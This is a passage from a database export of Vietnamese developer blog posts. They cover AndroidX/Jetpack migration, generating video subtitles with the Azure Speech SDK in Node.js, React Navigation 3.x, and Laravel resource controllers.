ích Android Studio (AS) để thực hiện tái cấu trúc.\n\nChạy nó từ menu của Android Studio: *Refactor\\Refactor to AndroidX*\n\n![AS_AndroidX_refactor_tool](https://miro.medium.com/max/962/1*geyQI-VjQ8KCOk9uFw74iA.png)\n\nCông cụ này sẽ quét ứng dụng của bạn và hiển thị cho bạn bản xem trước các thay đổi cần thiết:\n\n![](https://miro.medium.com/max/1400/1*3W7e5p9xQTnACbN8qw_R3w.png)\n\nNếu bạn ok với những thay đổi đó thì chọn button **Do Refactor**, và tool sẽ thực hiện theo ba điều sau:\n\n- Cập nhật các imports có liên quan tới package name mới:\n\n![](https://miro.medium.com/max/1400/1*B1-nWakyH4JtiUYZzQsCLg.png)\n\n- Cập nhật các Gradle trong dependencies của bạn:\n\n![](https://miro.medium.com/max/1400/1*O-bGy-pnnowcGUYT21EEPQ.png)\n\n- Thêm 2 flags vào file `gradle.properties`. Flag đầu tiên sẽ nói với Android Plugin để sử dụng AndroidX package thay thế cho AppCompat, và flag thứ hai sẽ bật *Jetifier*, Đây là một tool để hỗ trợ với việc sử dụng các thư viện mở rộng (sẽ được mô tả chi tiết trong phần sau)\n\n```\nandroid.useAndroidX=true\nandroid.enableJetifier=true\n```\n\nNói chung, các thay đổi nên được tách biệt chỉ với 3 lĩnh vực này, nhưng theo kinh nghiệm của tôi, tôi đã thấy công cụ tái cấu trúc cũng thực hiện các thay đổi khác. Trong trường hợp của tôi, công cụ đã thêm code cho Nullability của Kotlin (nó đã thêm một vài !! trong source code của tôi), nhưng có khả năng sẽ có những thay đổi khác. Đó là một ý tưởng thực sự tốt để theo dõi chặt chẽ tất cả các thay đổi mà công cụ thực hiện và đảm bảo bạn cảm thấy thoải mái với chúng.\n\n## Jetifier\n\nAS refactor tool chỉ thay đổi source code trong project của ạn. Nó không thay đổi bất kỳ thư viện và các dependencies ngoài nào cả.\n\n**Để làm điều này, Google đã tạo ra một công cụ có tên Jetifier được thiết kế để tự động chuyển đổi các phụ thuộc bắc cầu để sử dụng các thư viện AndroidX trong thời gian xây dựng. Nếu chúng ta không có công cụ này, chúng ta sẽ phải đợi mọi lib của bên thứ 3 cập nhật, trước khi chúng ta có thể sử dụng nó (và trì hoãn cập nhật của chúng tôi cho đến khi điều này sẵn sàng).**\n\n\nKhác với việc kích hoạt công cụ này bằng cách sử gradle flag, không có nhiều điều cần biết về việc sử dụng nó, vì đây là một quy trình tự động và không cần cấu hình.\n\nGoogle gần đây đã công bố một tùy chọn độc lập để chạy Jetifier. Thậm chí, bạn còn có thể chạy một chế độ đảo ngược, một chế độ đảo ngược, mã này sẽ giúp loại bỏ mã lỗi (sẽ rất hữu ích cho việc gỡ lỗi).\n\n## Một vài vấn đề mà bạn có thể gặp phải\n\nBạn có thể khám phá một thư viện bên thứ 3 cần được cập nhật. Ví dụ, một người nào đó đã phát hiện ra phiên bản hiện tại của SqlDelight yêu cầu một phiên bản cũ của thư viện Room. Họ được yêu cầu cập nhật và Square đã cung cấp phiên bản cập nhật của lib. Nếu bạn phát hiện ra một vấn đề, bạn càng sớm có thể yêu cầu cập nhật từ nhà phát triển càng tốt. Phiên bản mới nhất của Room (v2.1) đã yêu cầu AndroidX, điều này có thể sẽ khiến nhiều người nâng cấp. Khi viết bài này, SDK Facebook không được cập nhật và nhiều khả năng đây sẽ là một công cụ bị chặn đối với nhiều người.\n\nCập nhật dự án của bạn lên các phiên bản mới nhất của AppCompat có thể không đơn giản. Bạn có thể có cách giải quyết trong code của mình cho các lỗi trước đó hoặc gặp phải các bản nâng cấp yêu cầu sửa lại đáng kể. Cần lên kế hoạch trước để tính cho công việc này.\n\nSource files không bị thay đổi bởi Jetifier, thế nên nó có thể mang lại một số e ngại khi sử dụng tài liệu\n\nMột số tên thay thế không được ánh xạ chính xác (những cái này dường như chủ yếu từ lib design). Công cụ tái cấu trúc đã giành được công việc của Keith trong các trường hợp này và mã của bạn đã giành được phần mềm biên dịch. Để giải quyết những điều này, bạn sẽ cần giải quyết thủ công nhập khẩu. Hy vọng, những vấn đề này sẽ được giảm thiểu theo thời gian, vì các công cụ đã hoàn thiện và các lỗi trong công cụ tái cấu trúc đã được sửa.\n\n### Vài gợi ý hữu ích:\n\nChuẩn convention đặt tên của Jetpack là trùng với package name trong Maven coordinates. Trong Jetpack, package sẽ luôn đồng nhất với groupid.\n\nVí dụ, nếu bạn biết package name là `androidx.webkit` thì dependency sẽ map với: `androidx.webkit:webkit:VERSION`\n\n## Tóm lại\n\nLập kế hoạch trước cho những thay đổi được yêu cầu khi migration sang Jetpack, nó sẽ được yêu cầu thay đổi liên tục. Phần khó nhất của việc nâng cấp có thể sẽ là cập nhật dự án của bạn lên các dependencies mới nhất.\n\nCó khả năng các thư viện của bên thứ 3 đã được cập nhật. Điều quan trọng là xác định sớm những điều này và yêu cầu nhà phát triển cập nhật chúng.\n\nNguồn: [Converting your Android App to Jetpack](https://medium.com/google-developer-experts/converting-your-android-app-to-jetpack-85aecfce34d3)	Google đã rebranded các thư viện hỗ trợ của họ với tên mới là Jetpack (hay còn gọi là AndroidX). Và các Deveploer cần phải thay đổi để phù hợp với việc này.\n\nBài này sẽ nói rõ hơn để trả lời cho câu hỏi, nó là cái gì? Làm thế nào để có thể bắt đầu chuyển đổi ứng dụng của bạn để sử dụng thành phần mới này?\n\nJetpack là gì\n\nAndroid Jetpack là một tập hợp các thư viện, công cụ (tools) và hướng dẫn ...	{}	1	Chuyển đổi ứng dụng Android của bạn sang sử dụng Jetpack	{android-jetpack,android}	0	f	2022-12-18 15:33:38.251+00	2022-12-18 15:33:38.251+00
31924	Chắc hẳn đã có đôi lần bạn tìm thấy một video trên mạng nói về đúng vấn đề mà mình đang quan tâm nhưng hơi buồn là khả năng nghe tiếng anh của bạn không được tốt nên nhiều khi làm cho việc tìm kiếm trước đó trở nên vô nghĩa.\nGiá như video đó có thêm phần subtile thì tốt biết mấy. Còn nếu như nó không có thì chúng ta sẽ tự tạo cho nó vậy.\n\n## Speach To Text là gì\nĐây là dịch vụ chuyển đổi âm thanh giọng nói thành văn bản được hỗ trợ bởi Google, Azure (Microsoft) hay Apple. Tuy nhiên với một tài khoản free thì Azure của Microsoft hỗ trợ cho chúng ta tốt hơn cả. Vì thế trong bài viết này mình sẽ hướng dẫn các bạn sử dụng Nodejs để  tạo ra một ứng dụng tự động tạo subtitle cho video nhé. Nào bắt đầu thôi !\n\n## Tạo tài khoản Azure\nCác bạn có thể vào [đây](https://azure.microsoft.com/en-us/) để tạo tài khoản Azure, nếu có mastercard thì sẽ được hỗ trợ tốt hơn.\nĐây là mà hình dashboard sau khi đã đăng kí thành công tài khoản Azure.\n\n![](https://images.viblo.asia/f7441940-1760-4dd5-860c-a435ca836838.png)\n\nCác bạn vào phần [Resource groups](https://portal.azure.com/#blade/HubsExtension/BrowseResourceGroupBlade/resourceType/Microsoft.Resources%2Fsubscriptions%2FresourceGroups) và tạo mới một subcription \n\n![](https://images.viblo.asia/815f0276-16a1-4d7f-b642-1aa814ddc1cb.png)\n\nVới mỗi một subcription đăng ký chúng ta sẽ được cung cấp `subscription key`, đây là thứ chung ta cần để có thể sử dụng được SDK mà Azure cung cấp.\n\n## Xây dựng ứng dụng\nChúng ta sẽ tạo ra 4 service tương ứng với 4 bước mà chúng ta cần phải làm để có thể tạo được subtitle cho video.  Và cuối cùng, trong `routes/transcriptions.js` chúng ta sẽ gọi chúng ra như thế này:\n\n```javascript\nconst express = require('express')\nconst router = express.Router()\nconst Uploader = require('../services/uploader')\nconst Converter = require('../services/converter')\nconst Transcription = require('../services/transcription')\nconst Subtitle = require('../services/subtitle')\n\nrouter.post('/transcriptions', async (req, res) => {\n  Uploader.saveFile(req, res)\n    .then(filename => Converter.videoToAudio(filename))\n    .then(filename => Transcription.speechToText(filename))\n    .then(result => Subtitle.write(result))\n    .then(subtitle => res.send({subtitle: subtitle}))\n})\n\nmodule.exports = router\n```\nToàn bộ source code mình có để trên github. Các bạn có thể vào [đây](https://github.com/dongoclam/awesome-player) để xem chi tiết hơn.\n\n**Bước 1: Thực hiện lưu lại video được gửi lên từ phía client**\n\nTương tự như việc xử lý upload file trong Nodejs. Chúng ta sẽ xử dụng `formidable` để lưu video vào thư mục đã được định sẵn ở trong `config.uploadDir`.\n\n```javascript\nconst path = require('path')\nconst fs = require('fs')\nconst formidable = require('formidable')\nconst config = require('../config')\n\nclass Uploader {\n  constructor() {}\n}\n\nUploader.form = new formidable.IncomingForm()\nUploader.form.multiples = false\nUploader.form.keepExtensions = true\nUploader.form.uploadDir = config.uploadDir\nUploader.form.maxFileSize = 200 * 1024 * 1024;\n\nUploader.saveFile = function(req, res) {\n\n  fs.existsSync(config.uploadDir) || fs.mkdirSync(config.uploadDir)\n\n  this.form.onPart = (part) => {\n    if (!part.filename || part.mime.match(/audio\\/|video\\//)) {\n      this.form.handlePart(part)\n    } else {\n      res.send({error: 'File type not allowed'})\n    }\n  }\n\n  this.form.parse(req)\n\n  this.form.on('fileBegin', (field, file) => {\n    file.path = file.path.replace('upload_', '')\n  })\n\n  this.form.on('error', function(error) {\n    res.send({error: error})\n  })\n\n  return new Promise((resolve, reject) => {\n    this.form.on('file', (name, file) => {\n      resolve(path.basename(file.path))\n    })\n  })\n}\n\nmodule.exports = Uploader\n```\n\nĐể ý rằng `config.uploadDir` là thư mục chúng ta sử dụng để lưu video cũng như các file kết quả khác trong quá trình thực hiện. Sau khi thực hiện xong việc lưu video vào thư mục định trước, service `Uploader` sẽ trả về tên video để chuyển sang bước 2.\n\n**Bước 2: Convert video sang audio**\n\nMặc định, SDK của Azure chỉ chấp nhận đầu vào là một mono audio có định dạng `.wav`. Chúng ta sử dụng `ffmpeg` để thực hiện việc chuyển đổi này:\n\n```javascript\nconst ffmpegPath = require('@ffmpeg-installer/ffmpeg').path;\nconst ffmpeg = require('fluent-ffmpeg');\nconst crypto = require('crypto')\nconst fs = require('fs')\nconst config = require('../config')\n\nffmpeg.setFfmpegPath(ffmpegPath);\n\nclass Converter {\n  constructor() {}\n}\n\nConverter.videoToAudio = function(videoName) {\n  const videoPath = config.uploadDir + videoName\n  const audioName = crypto.randomBytes(16).toString("hex") + ".wav"\n  const audioPath = config.uploadDir + audioName\n  \n  return new Promise((resolve, reject) => {\n    ffmpeg(videoPath).withNoVideo().outputFormat('wav').audioChannels(1)\n      .audioBitrate(128).audioFrequency(16000).save(audioPath)\n      .on('end', () => {\n        resolve(audioName)\n        fs.unlinkSync(videoPath)\n      })\n  })\n}\n\nmodule.exports = Converter\n```\nService `Converter` sẽ nhận đầu vào là tên video và chuyển đổi nó sang một audio có các thông số theo yêu cầu của Azure. Sau quá trình xử lý, chúng ta sẽ trả về tên của audio để dùng nó cho các bước tiếp theo. Đồng thời sẽ xóa video này đi vì lúc này nó không còn cần thiết nữa.\n\n**Bước 3: Chuyển đổi audio thành văn bản**\n\nĐể sử dụng SDK của Azure, chúng ta chạy lệnh sau để cài đặt:\n\n```\nnpm install microsoft-cognitiveservices-speech-sdk\n```\nNói qua một chút về quá trình chuyển đổi này, mỗi một audio sẽ được chia ra thành các khoảng thời gian từ 15 đến 30s. Kết quả trả về của một đoạn sẽ phụ thuộc vào đoạn đằng trước và đằng sau nó. Lý do cho điều này là để tránh mất mát dữ liệu cũng như việc tạo ra các văn bản phù hợp với ngữ cảnh hơn. Service `Transcription` sẽ nhận vào tên của audio và thực hiện việc chuyển đổi. `YOUR_SERVICE_REGION` và `YOUR_SUBSCRIPTION_KEY` các bạn có thể tìm nó ở mục Overview trong phần thông tin chi tiết của subscription mà bạn đã đăng ký.\n\n```javascript\nconst fs = require('fs')\nconst sdk = require('microsoft-cognitiveservices-speech-sdk')\nconst config = require('../config')\n\nclass Transcription {\n  constructor() {}\n}\n\nTranscription.serviceRegion = 'YOUR_SERVICE_REGION'\nTranscription.subscriptionKey = 'YOUR_SUBSCRIPTION_KEY'\n\nTranscription.speechToText = function(filename, language = 'en-US') {\n  const filePath = config.uploadDir + filename\n  const pushStream = sdk.AudioInputStream.createPushStream()\n\n  fs.createReadStream(filePath)\n    .on('data', function(arrayBuffer) {\n      pushStream.write(arrayBuffer.buffer)\n    })\n    .on('end', function() {\n      pushStream.close()\n    })\n\n  const audioConfig = sdk.AudioConfig.fromStreamInput(pushStream)\n  const speechConfig = sdk.SpeechConfig.fromSubscription(\n    this.subscriptionKey,\n    this.serviceRegion\n  )\n\n  speechConfig.speechRecognitionLanguage = language\n\n  const recognizer = new sdk.SpeechRecognizer(speechConfig, audioConfig)\n  \n  recognizer.startContinuousRecognitionAsync()\n\n  return new Promise((resolve, reject) => {\n    let result = []\n    \n    recognizer.recognized = (r, event) => {\n      result.push(JSON.parse(event.privResult.privJson))\n    }\n  \n    recognizer.sessionStopped = () => {\n      resolve(result)\n      fs.unlinkSync(filePath)\n    }\n  })\n}\n\nmodule.exports = Transcription\n```\nKết quả của mỗi đoạn sẽ được trả về trong event `recognizer.recognized`. Chúng ta sẽ lưu nó vào trong một biến `result` và trả về để đi đến bước cuối cùng.\n\n**Bước 4: Ghi subtitle cho video**\n\nỞ bước thứ 3 chúng ta nhận được một mảng data là dữ liệu của các đoạn tương ứng với các khoảng thời gian được tách ra từ audio.\nViệc của chúng ta sẽ là đọc và ghi ra một file có định dạng `.vtt`.  Service `Subtitle` cuối cùng sẽ trả về tên file subttile tương ứng sau khi đã thực hiện xong công việc của mình.\n\n```javascript\nconst fs = require('fs')\nconst crypto = require('crypto')\nconst config = require('../config')\n\nclass Subtitle {\n  constructor() {}\n}\n\nSubtitle.write = function(subtitle) {\n  const fileName = crypto.randomBytes(16).toString("hex") + ".vtt"\n  const filePath = config.uploadDir + fileName\n  const stream = fs.createWriteStream(filePath)\n  \n  return new Promise((resolve, reject) => {\n    stream.once('open', function() {\n      let duration = 0\n      stream.write('WEBVTT')\n      subtitle.forEach(sub => {\n        let startTime = duration\n        duration = duration + sub.Duration\n  \n        if(sub.DisplayText) {\n          stream.write('\\n\\n')\n          stream.write(timeConvert(startTime) + " --> " + timeConvert(duration))\n          stream.write('\\n')\n          stream.write(sub.DisplayText)\n        }\n      })\n      stream.close()\n      resolve(fileName)\n    })\n  })\n}\n\nfunction timeConvert(time) {\n  time = time / 10000000\n  var seconds = (time % 60).toFixed(3)\n  var minutes = Math.floor(time / 60) % 60\n  var hours = Math.floor(time / 3600)\n\n  minutes = minutes < 10 ? `0${minutes}` : minutes\n  seconds = seconds < 10 ? `0${seconds}` : seconds\n  hours = hours < 10 ? `0${hours}` : hours\n\n  return `${hours}:${minutes}:${seconds}`\n}\n\nmodule.exports = Subtitle\n```\nKiểm tra trong thư mục `config.uploadDir` chúng ta sẽ thấy có một file định dạng `.vtt`, mở nó lên để xem chúng ta đã nhận được những gì nhé.\n## Summary\nVừa rồi mình đã giới thiệu về dịch vụ Speech To Text và ứng dụng nó vào việc tự động tạo subtitle cho video. SDK của Azure còn hỗ trợ việc chuyển đổi âm thanh giọng nói từ ngôn ngữ này sang văn bản của ngôn ngữ khác và ngược lại. Rất may mắn là nó có hỗ trợ cả tiếng việt, các bước thực hiện cũng tương tự như ở trên chỉ khác ở phần setting thông số đầu vào và đầu ra trong cho SDK. Không chỉ tạo subtitle cho video, các bạn có thể sử dụng nó vào việc tạo ra một ứng dụng có khả năng điều khiển bằng giọng nói hay nhiều thứ hay ho khác. Mình có demo ứng dụng của mình ở [đây](https://awesomeplayer.herokuapp.com/), quá trình lấy subtitle mất khá nhiều thời gian nên thường sẽ bị lỗi timeout. Vì vậy các bạn hoàn toàn có thể chạy dưới local của mình để có được kết quả tốt nhất nhé.\n\nBlog: https://www.dnlblog.com/posts/speech-to-text-tao-subtitle-tu-dong-cho-video	Chắc hẳn đã có đôi lần bạn tìm thấy một video trên mạng nói về đúng vấn đề mà mình đang quan tâm nhưng hơi buồn là khả năng nghe tiếng anh của bạn không được tốt nên nhiều khi làm cho việc tìm kiếm trước đó trở nên vô nghĩa.\nGiá như video đó có thêm phần subtile thì tốt biết mấy. Còn nếu như nó không có thì chúng ta sẽ tự tạo cho nó vậy.\n\nSpeach To Text là gì\nĐây là dịch vụ chuyển đổi âm thanh ...	{https://images.viblo.asia/f7441940-1760-4dd5-860c-a435ca836838.png,https://images.viblo.asia/815f0276-16a1-4d7f-b642-1aa814ddc1cb.png}	1	Speech to Text - Tạo subtitle tự động cho video	{videosubtitle,speech-to-text}	0	f	2022-12-18 15:33:38.311+00	2022-12-18 15:33:38.311+00
31637	![](https://i.imgur.com/DX7Nj8O.jpg)\n# I. Giới thiệu\n1 trong những điều lập trình mobile phải học và quan tâm khi phát triển ứng dụng là điều hướng app. Nếu ứng dụng điều hướng app quá rắc rối thì sẽ gây khó hiểu cho người dùng và bản thân dev cũng tốn công trong việc maintain app.\n\nTrong bài biết này tôi xin giới thiệu với các bạn `React Navigation 3.x` để phục vụ mục đích điều hướng màn hình trong react native.\n\nReact Navigation được sinh ra để dễ dàng điều hướng app khi được viết bằng Javascript và với performance tốt nhất có thể.\n# II. Cách sử dụng\n## 1. Cài đặt\n\nTrước khi tiến hành cài `react-navigation`  tôi xin lưu ý 1 số vấn đề sau để dễ dàng thống nhất môi trường giữa tôi và bạn:\n\n```java\n+ Tôi đang sử dụng: react-native-cli\n+ Node: 10.15.0\n+ React: 16.8.3\n+ React Native: 0.59.9\n+ Xcode: 10.2.1\n+ Android Studio: 3.3.2\n```\n\nTrong bài viết này tôi dùng chủ yếu `yarn` nên bạn phải cài theo hướng dẫn trong https://yarnpkg.com/en/ nhé.\n\nCài đặt `react-navigation` \n\n> yarn add react-navigation\n> \n> #or with npm\n>\n> #npm install react-navigation\n> \n\nCài `react-native-gesture-handler`\n\n> yarn add react-native-gesture-handler\n> \n>#or with npm\n>\n>#npm install react-native-gesture-handler\n\nTrong React Native >= 0.60 sẽ được link `react-native-gesture-handler` tự động. Nhưng nếu bạn dùng React Native cũ hơn thì sẽ phải link theo lệnh sau:\n\n> react-native link react-native-gesture-handler\n\n\n##### Cấu hình riêng cho Android\nĐể hoàn tất cài đặt cho Android thì bạn cần phải thêm đoạn code sau:\n\n```java\npackage com.demoreactnavigation;\n\nimport com.facebook.react.ReactActivity;\nimport com.facebook.react.ReactActivityDelegate;\nimport com.facebook.react.ReactRootView;\nimport com.swmansion.gesturehandler.react.RNGestureHandlerEnabledRootView;\n\npublic class MainActivity extends ReactActivity {\n\n    /**\n     * Returns the name of the main component registered from JavaScript.\n     * This is used to schedule rendering of the component.\n     */\n    @Override\n    protected String getMainComponentName() {\n        return "DemoReactNavigation";\n    }\n\n+     @Override\n+     protected ReactActivityDelegate createReactActivityDelegate() {\n+         return new ReactActivityDelegate(this, getMainComponentName()) {\n+             @Override\n+             protected ReactRootView createRootView() {\n+                 return new RNGestureHandlerEnabledRootView(MainActivity.this);\n+             }\n+         };\n+     }\n}\n\n```\n\n## 2. Coding\n\nĐể dễ theo dõi các bạn có thể pull ví dụ tôi đã làm sẵn :\n\n> git clone -b bottom_tab_navigator https://github.com/oTranThanhNghia/DemoReactNavigation.git\n> \n\nĐể đơn giản ta sẽ tạo 2 tab màn hình và 1 nút để đi tới màn hình khác:\n\n![](https://i.imgur.com/ALEXlPu.png)\n\nOK, chúng ta cùng tạo màn hình Home đầu tiên nhé \n`HomeScreen.js`\n\n```javascript\nimport React, { Component } from "react";\nimport { StyleSheet, Text, View, Button } from "react-native";\n\nexport default class HomeScreen extends Component {\n  render() {\n    return (\n      <View style={styles.container}>\n        <Text>Home</Text>\n        <Button\n          title="Go to Details"\n          onPress={() => this.props.navigation.navigate("Details")}\n        />\n      </View>\n    );\n  }\n}\n\nconst styles = StyleSheet.create({\n  container: {\n    flex: 1,\n    backgroundColor: "#fff",\n    alignItems: "center",\n    justifyContent: "center"\n  }\n});\n\n```\n\nTrong đó: `this.props.navigation.navigate("Details")` thì \n\n+  `navigation` là prop chứa toàn bộ screen component được khai báo trong stack navigator \n+    `navigate("Details")` là function để gọi điều hướng màn hình\n\n\nTương tự như vậy chúng ta sẽ tạo `DetailsScreen.js` và `SettingsScreen.js`\n\nĐối với `DetailsScreen.js`\n```javascript\nimport React, { Component } from "react";\nimport { StyleSheet, Text, View } from "react-native";\n\nexport default class DetailsScreen extends Component {\n  render() {\n    return (\n      <View style={styles.container}>\n        <Text>Details</Text>\n      </View>\n    );\n  }\n}\n\nconst styles = StyleSheet.create({\n  container: {\n    flex: 1,\n    backgroundColor: "#fff",\n    alignItems: "center",\n    justifyContent: "center"\n  }\n});\n```\n\nvà `SettingsScreen.js`\n```javascript\nimport React, { Component } from "react";\nimport { StyleSheet, View, Text } from "react-native";\n\nexport default class SettingsScreen extends Component {\n  render() {\n    return (\n      <View style={styles.container}>\n        <Text>Setting</Text>\n      </View>\n    );\n  }\n}\n\nconst styles = StyleSheet.create({\n  container: {\n    flex: 1,\n    backgroundColor: "#fff",\n    alignItems: "center",\n    justifyContent: "center"\n  }\n});\n```\n\nSau đây là phần quan trọng nhất:\nCác bạn tạo `AppNavigator.js` để tạo danh sách screen có thể điều hướng được\n\n```javascript\nimport {\n  createAppContainer,\n  createBottomTabNavigator,\n  createStackNavigator\n} from "react-navigation";\nimport HomeScreen from "app/HomeScreen";\nimport DetailsScreen from "app/DetailsScreen";\nimport SettingsScreen from "app/SettingsScreen";\n\nconst HomeStack = createStackNavigator({\n  Home: { screen: HomeScreen },\n  Details: { screen: DetailsScreen }\n});\n\nconst SettingsStack = createStackNavigator({\n  Settings: { screen: SettingsScreen },\n  Details: { screen: DetailsScreen }\n});\n\nconst AppNavigator = createBottomTabNavigator(\n  {\n    Home: {\n      screen: HomeStack,\n      navigationOptions: {\n        title: "Home"\n      }\n    },\n    Setting: {\n      screen: SettingsStack,\n      navigationOptions: {\n        title: "Setting"\n      }\n    }\n  }\n);\n\nexport default createAppContainer(AppNavigator);\n\n```\n\nTrong đó:\n+ `Details: { screen: DetailsScreen }` thì `Details` là key để điều hướng còn `DetailsScreen` là screen componet để hiển thị.\n+ `createStackNavigator` cung cấp cách để điều hướng các màn hình mà màn hình mới được hiển thị nằm trên đỉnh Stack\n+ `createBottomTabNavigator` là tab bar đơn giản nằm phía dưới màn hình và cho phép điều hướng màn hình thông qua các nút tab đó\n+ `createAppContainer` sẽ chứa toàn bộ screen component và giúp quản lý state và điều hướng app dễ dàng.\n\n### Chia sẻ kinh nghiệm khi run-ios/run-android\n\nCó 1 thực tế rằng chạy lệnh react-native run-ios hay run-android có khá nhiều lỗi xảy ra. Vậy nên các đơn giản hơn để chạy app mà ít lỗi nhất là mở Xcode hay Android Studio để build trước\n\nCác bước như sau:\n+ Bước 1: Chạy Metro Bundler trước\n> $ react-native start\n> \n\n![](https://images.viblo.asia/ada5e5de-064f-4858-94d2-bca67ea49449.png)https://images.viblo.asia/ada5e5de-064f-4858-94d2-bca67ea49449.png\n\nĐối với riêng Android thêm bước sau:\n> $ adb reverse tcp:8081 tcp:8081\n> \n + Bước 2: Mở `Xcode` hay `Android Studio` để đồng bộ project rồi tiến hành **RUN** app\n\n### Chia sẻ cách loại bỏ link gián tiếp "../" thành trực tiếp "app/' ở import \n\nBạn nhìn kiểu code này quen chứ ?\n```javascript\nimport SomeExample from '../../../some/example.js';\nconst OtherExample = require('../../../other/example.js');\n```\n\nCó rất nhiều cách để bạn loại bỏ link gián tiếp ví dụ như dùng:\n\n[`babel-plugin-root-import` ](https://www.npmjs.com/package/babel-plugin-root-import)\n\nNhưng cách này config khá nhiều và sau đây tôi xin giới thiệu cách ngắn gọn và đơn giản hơn nhiều\n\n+ Bước 1: Tạo file `package.json` dưới folder code js của bạn\n\n![](https://images.viblo.asia/cbc4ea76-a36f-4a02-ba05-7597f9f3f244.png)\n\nBên trong `package.json` như sau:\n\n```json\n{\n  "name": "app"\n}\n```\n\n+ Bước 2: Tạo file `jsconfig.json` để config vscode của bạn\n\n![](https://images.viblo.asia/80c96928-5549-45f3-8ba3-9bbb217a59e5.png)\n\nBên trong `jsconfig.json` như sau:\n\n```json\n{\n  "allowJs": true,\n  "compilerOptions": {\n    "target": "es6",\n    "module": "commonjs",\n    "allowSyntheticDefaultImports": true,\n    "baseUrl": ".",\n    "paths": {\n      "app/*": ["app/*"]\n    }\n  },\n  "exclude": ["node_modules", "**/node_modules/*"]\n}\n```\n\nTrong đó :\n```\n"paths": {\n      "app/*": ["app/*"]\n    }\n```\n\nđể VsCode biết code nằm ở đâu\n\nChi tiết hơn bạn có thể xem trong link dưới đây: \n\nhttps://code.visualstudio.com/docs/nodejs/working-with-javascript\n\n# III. Demo\n## 1. Android\n\n![](https://i.imgur.com/sndmLUO.gif)\n\n## 2. iOS\n\n![](https://i.imgur.com/s3uRRRI.gif)\n\n# IV. Tài liệu tham khảo\n1. https://reactnavigation.org/docs/en/getting-started.html\n2. https://reactnavigation.org/docs/en/tab-based-navigation.html	![](https://i.imgur.com/DX7Nj8O.jpg)\n\n\nI. Giới thiệu\n1 trong những điều lập trình mobile phải học và quan tâm khi phát triển ứng dụng là điều hướng app. Nếu ứng dụng điều hướng app quá rắc rối thì sẽ gây khó hiểu cho người dùng và bản thân dev cũng tốn công trong việc maintain app.\n\nTrong bài biết này tôi xin giới thiệu với các bạn React Navigation 3.x để phục vụ mục đích điều hướng màn hình trong react native.\n\nReact Navigation đư...	{https://i.imgur.com/DX7Nj8O.jpg,https://i.imgur.com/ALEXlPu.png,https://images.viblo.asia/ada5e5de-064f-4858-94d2-bca67ea49449.png,https://images.viblo.asia/cbc4ea76-a36f-4a02-ba05-7597f9f3f244.png,https://images.viblo.asia/80c96928-5549-45f3-8ba3-9bbb217a59e5.png,https://i.imgur.com/sndmLUO.gif,https://i.imgur.com/s3uRRRI.gif}	1	Học React Native từ cơ bản đến nâng cao - Phần 5: Sử dụng React Navigation 3.x và 1 số chia sẻ cá nhân	{cross-platform-app-development,androidios,react-native}	0	f	2022-12-18 15:33:38.105+00	2022-12-18 15:33:38.105+00
31975	## Giới thiệu\nTrong laravel, việc sử dụng các route post, get, group để gọi đến 1 action của Controller đã là quá quen đối với các bạn sử dụng framework này. \nTrong 1 dự án, làm việc với các action đọc, thêm, xóa, sửa có lẽ là không thể tránh khỏi. Như vậy với mỗi action này, ta sẽ phải viết 1 dòng route::method(). Như thế sẽ dẫn đến việc file route của các bạn sẽ dài và khó đọc. \nLaravel cung cấp cho chúng ta 1 công cụ vô cùng hữu ích để tối ưu hóa code cho việc này, đó chính là Resource controllers.\n\nĐể có thể thấy rõ hơn lợi ích khi sử dụng resource controllers, mình sẽ đưa ra 1 ví dụ như sau:\nBạn muốn tạo 1 controller để xử lý tất cả các request cho "Photos" được lưu trữ bởi ứng dụng của bạn. Bạn sử dụng lệnh dưới đây sẽ tạo cho bạn 1 controller như vậy.\n```php\nphp artisan make:controller PhotoController --resource\n```\nSau khi chạy lệnh trên, đây là file controller được sinh ra\n```php\n<?php\n\nnamespace App\\Http\\Controllers;\n\nuse Illuminate\\Http\\Request;\n\nclass PhotoController extends Controller\n{\n    /**\n     * Display a listing of the resource.\n     *\n     * @return \\Illuminate\\Http\\Response\n     */\n    public function index()\n    {\n        //\n    }\n\n    /**\n     * Show the form for creating a new resource.\n     *\n     * @return \\Illuminate\\Http\\Response\n     */\n    public function create()\n    {\n        //\n    }\n\n    /**\n     * Store a newly created resource in storage.\n     *\n     * @param  \\Illuminate\\Http\\Request  $request\n     * @return \\Illuminate\\Http\\Response\n     */\n    public function store(Request $request)\n    {\n        //\n    }\n\n    /**\n     * Display the specified resource.\n     *\n     * @param  int  $id\n     * @return \\Illuminate\\Http\\Response\n     */\n    public function show($id)\n    {\n        //\n    }\n\n    /**\n     * Show the form for editing the specified resource.\n     *\n     * @param  int  $id\n     * @return \\Illuminate\\Http\\Response\n     */\n    public function edit($id)\n    {\n        //\n    }\n\n    /**\n     * Update the specified resource in storage.\n     *\n     * @param  \\Illuminate\\Http\\Request  $request\n     * @param  int  $id\n     * @return \\Illuminate\\Http\\Response\n     */\n    public function update(Request $request, $id)\n    {\n        //\n    }\n\n    /**\n     * Remove the specified resource from storage.\n     *\n     * @param  int  $id\n     * @return \\Illuminate\\Http\\Response\n     */\n    public function destroy($id)\n    {\n        //\n    }\n}\n\n```\n## Khai báo\nTiếp theo bạn khai báo route cho controller\n```php\nRoute::resource('photos', 'PhotoController');\n```\nChỉ với 1 dòng khai báo như này, là bạn đã khai báo cho tất cả các action trong PhotoController.\nBạn cũng có thể khai báo cho nhiều resource controller cùng 1 lúc bằng cách truyền vào 1 mảng cho phương thức resouce:\n```php\nRoute::resources([\n    'photos' => 'PhotoController',\n    'posts' => 'PostController'\n]);\n```\n## Các action được xử lý bởi resource controller:\n\n\n|Phương thức|URI | Hành động|Tên route|\n| -------- | -------- | -------- | ------|\n| GET     |`/photos` | index   | photos.index|\n| GET     |`/photos/create` |\tcreate   | \tphotos.create|\n| POST     |`/photos` | \tstore  | photos.store|\n| GET     |`/photos/{photo}` | show   |photos.show|\n| GET     |`/photos/{photo}/edit` | edit | photos.edit|\n| PUT/PATCH     |`/photos/{photo}` |update   | photos.update|\n| DELETE     |`/photos/{photo}` |destroy   |photos.destroy|\n## Cách giả method\nVí trong html không có các method PUT, PATCH, DELETE nên bạn sẽ cần dùng lệnh `@method` để có thể gán các method này vào cho bạn.\n```html\n<form action="/foo/bar" method="POST">\n    @method('PUT')\n</form>\n```\n## Partial Resource Routes\nKhi khai báo resource route như ban đầu mình hướng dẫn, hệ thống sẽ mặc định sẽ xử lý toàn bộ các action trong đó. Tuy nhiên, nếu bạn chỉ muốn dùng 1 số action nhất định trong đó, bạn có thể khai báo như sau:\n```php\nRoute::resource('photos', 'PhotoController')->only([\n    'index', 'show'\n]);\n```\nhoặc \n```php\nRoute::resource('photos', 